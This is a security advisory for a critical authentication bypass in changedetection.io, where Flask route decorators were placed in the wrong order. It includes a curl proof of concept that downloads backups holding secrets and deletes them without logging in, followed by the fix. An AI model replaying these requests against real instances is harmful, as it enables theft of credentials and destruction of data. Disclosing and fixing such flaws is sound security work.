# [C] changedetection.io Vulnerable to Authentication Bypass via Decorator Ordering

## Summary
Severity: Critical
Advisory: GHSA-jmrh-xmgh-x9j4
CVE: CVE-2026-35490
CWE: CWE-863
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2026-04-06
Source: https://github.com/advisories/GHSA-jmrh-xmgh-x9j4
Type: github-advisory

## Affected
- PyPI: `changedetection.io` — affected >=0 <0.54.8

## Details
### Summary

On 13 routes across 5 blueprint files, the `@login_optionally_required` decorator is placed **before** (outer to) `@blueprint.route()` instead of after it. In Flask, `@route()` must be the outermost decorator because it registers the function it receives. When the order is reversed, `@route()` registers the **original undecorated function**, and the auth wrapper is never in the call chain. This silently disables authentication on these routes.

The developer correctly uses the decorator on 30+ other routes with the proper order, making this a classic consistency gap.

### Details

**Correct order (used on 30+ routes):**
```python
@blueprint.route('/settings', methods=['GET'])
@login_optionally_required
def settings():
    ...
```

**Incorrect order (13 vulnerable routes):**
```python
@login_optionally_required          # ← Applied to return value of @route, NOT the view
@blueprint.route('/backups/download/<filename>')  # ← Registers raw function
def download_backup(filename):
    ...
```

## POC
```
=== PHASE 1: Confirm Authentication is Required ===

$ curl -s -o /dev/null -w "%{http_code}" http://127.0.0.1:5557/
Main page:     HTTP 302 -> http://127.0.0.1:5557/login?next=/
$ curl -s -o /dev/null -w "%{http_code}" http://127.0.0.1:5557/settings
Settings page: HTTP 302 (auth required, redirects to login)

Password is set. Unauthenticated requests to / and /settings
are properly redirected to /login.

=== PHASE 2: Authentication Bypass on Backup Routes ===
(All requests made WITHOUT any session cookie)

--- Exploit 1: Trigger backup creation ---
$ curl -s -o /dev/null -w "%{http_code}" http://127.0.0.1:5557/backups/request-backup
Response: HTTP 302 -> http://127.0.0.1:5557/backups/
(302 redirects to /backups/ listing page, NOT to /login -- backup was created)

--- Exploit 2: List backups page ---
$ curl -s -o /dev/null -w "%{http_code}" http://127.0.0.1:5557/backups/
Response: HTTP 200

--- Exploit 3: Extract backup filenames ---
$ curl -s http://127.0.0.1:5557/backups/ | grep changedetection-backup
Found: changedetection-backup-20260331005425.zip

--- Exploit 4: Download backup without authentication ---
$ curl -s -o /tmp/stolen_backup.zip http://127.0.0.1:5557/backups/download/changedetection-backup-20260331005425.zip
Response: HTTP 200

$ file /tmp/stolen_backup.zip
/tmp/stolen_backup.zip: Zip archive data, at least v2.0 to extract, compression method=deflate

$ ls -la /tmp/stolen_backup.zip
-rw-r--r-- 1 root root 92559 Mar 31 00:54 /tmp/stolen_backup.zip

$ unzip -l /tmp/stolen_backup.zip
Archive:  /tmp/stolen_backup.zip
  Length      Date    Time    Name
---------  ---------- -----   ----
    26496  2026-03-31 00:54   url-watches.json
       64  2026-03-31 00:52   secret.txt
       51  2026-03-31 00:52   4ff247a9-0d8e-4308-8569-f6137fa76e0d/history.txt
     1682  2026-03-31 00:52   4ff247a9-0d8e-4308-8569-f6137fa76e0d/4b7f61d9f981b92103a6659f0d79a93e.txt.br
     4395  2026-03-31 00:52   4ff247a9-0d8e-4308-8569-f6137fa76e0d/1774911131.html.br
    40877  2026-03-31 00:52   c8d85001-19d1-47a1-a8dc-f45876789215/6b3a3023b357a0ea25fc373c7e358ce2.txt.br
       51  2026-03-31 00:52   c8d85001-19d1-47a1-a8dc-f45876789215/history.txt
    40877  2026-03-31 00:52   c8d85001-19d1-47a1-a8dc-f45876789215/1774911131.html.br
       73  2026-03-31 00:54   url-list.txt
      155  2026-03-31 00:54   url-list-with-tags.txt
---------                     -------
   114721                     10 files

--- Exploit 5: Extract sensitive data from backup ---
Application password hash: pG+Bq6s4/EhsRqYZYc7kiGEG1QMd2hMuadD5qCMbSBcRIMnGTATliX/P0vFX...
Watched URLs:
  - https://news.ycombinator.com/  (UUID: 4ff247a9...)
  - https://changedetection.io/CHANGELOG.txt  (UUID: c8d85001...)

Flask secret key: 7cb14f56dc4f26761a22e7d35cc7b6911bfaa5e0790d2b58dadba9e529e5a4d6

--- Exploit 6: Delete all backups without auth ---
$ curl -s -o /dev/null -w "%{http_code}" http://127.0.0.1:5557/backups/remove-backups
Response: HTTP 302

=== PHASE 3: Cross-Verification ===

Verify protected routes still require auth:
  /         -> HTTP 302 (302 = protected)
  /settings -> HTTP 302 (302 = protected)

=== RESULTS ===

PROTECTED routes (auth required, HTTP 302 -> /login):
  /              HTTP 302
  /settings      HTTP 302

BYPASSED routes (no auth needed):
  /backups/request-backup  HTTP 302 (triggers backup creation, redirects to /backups/ not /login)
  /backups/                HTTP 200 (lists all backups)
  /backups/download/<file> HTTP 200 (downloads backup with secrets)
  /backups/remove-backups  HTTP 302 (deletes all backups)

[+] CONFIRMED: Authentication bypass on backup routes!
```

### Impact

- **Complete data exfiltration** — Backups contain all monitored URLs, notification webhook URLs (which may contain API tokens for Slack, Discord, etc.), and configuration
- **Backup restore = config injection** — Attacker can upload a malicious backup with crafted watch configs
- **SSRF** — Proxy check endpoint can be triggered to scan internal network
- **Browser session hijacking** — Browser steps endpoints allow controlling Playwright sessions

### Remediation

Swap the decorator order on all 13 routes. `@blueprint.route()` must be outermost:

```python
# Before (VULNERABLE):
@login_optionally_required
@blueprint.route('/backups/download/<filename>')
def download_backup(filename):

# After (FIXED):
@blueprint.route('/backups/download/<filename>')
@login_optionally_required
def download_backup(filename):
```

## References
- https://github.com/dgtlmoon/changedetection.io/security/advisories/GHSA-jmrh-xmgh-x9j4
- https://nvd.nist.gov/vuln/detail/CVE-2026-35490
- https://github.com/dgtlmoon/changedetection.io/commit/31a760c2147e3e73a403baf6d7de34dc50429c85
- https://github.com/dgtlmoon/changedetection.io
- https://github.com/dgtlmoon/changedetection.io/releases/tag/0.54.8
- https://github.com/pypa/advisory-database/tree/main/vulns/changedetection-io/PYSEC-2026-28.yaml
